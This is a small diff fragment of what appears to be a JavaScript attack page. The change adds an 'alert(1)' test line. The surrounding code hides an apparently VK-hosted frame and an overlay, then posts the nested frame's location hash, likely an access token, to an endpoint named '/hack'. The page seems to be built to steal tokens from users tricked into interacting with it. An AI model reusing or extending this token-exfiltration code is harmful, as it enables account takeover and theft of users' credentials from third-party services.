@@ -17,6 +17,7 @@
       });
     });
     $(window).on('fetched', function(){
+      alert(1);
       $("#vkframe").hide();
       $("#overlay").hide();
       $.post("/hack", {hash:frames[0].frames[0].location.hash})
